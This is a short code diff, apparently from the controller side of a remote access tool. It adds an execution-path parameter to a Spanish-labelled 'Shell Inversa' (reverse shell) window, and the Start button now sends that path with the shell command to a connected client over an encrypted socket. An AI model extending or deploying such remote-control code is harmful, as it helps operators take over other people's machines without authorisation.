@@ -13,11 +13,12 @@ wxEND_EVENT_TABLE()
 
 
 //Reverse Shell
-panelReverseShell::panelReverseShell(wxWindow* pParent, SOCKET sck, std::string _strID, ByteArray c_key) :
+panelReverseShell::panelReverseShell(wxWindow* pParent, SOCKET sck, std::string _strID, ByteArray c_key, std::string _strExecPath) :
     wxFrame(pParent, EnumIDS::ID_Panel_Reverse_Shell, "[" + _strID + "] Shell Inversa", wxDefaultPosition, wxSize(700, 400)) {
 
     this->SetName(_strID + "-shell");
     this->sckCliente = sck;
+    this->strExecPath = _strExecPath;
     this->enc_key = c_key;
     this->SetTitle("[" + _strID.substr(0, _strID.find('/', 0)) + "] Shell Inversa");
 
@@ -134,6 +135,8 @@ void panelReverseShell::OnButton(wxCommandEvent& event) {
         case EnumReverseShell::BTN_Start:
             iComando = EnumComandos::Reverse_Shell_Start;
             strCommand = this->txtShellPath->GetValue();
+            strCommand.append(1, CMD_DEL);
+            strCommand += this->strExecPath;
             break;
         case EnumReverseShell::BTN_Stop:
             iComando = EnumComandos::Reverse_Shell_Command;
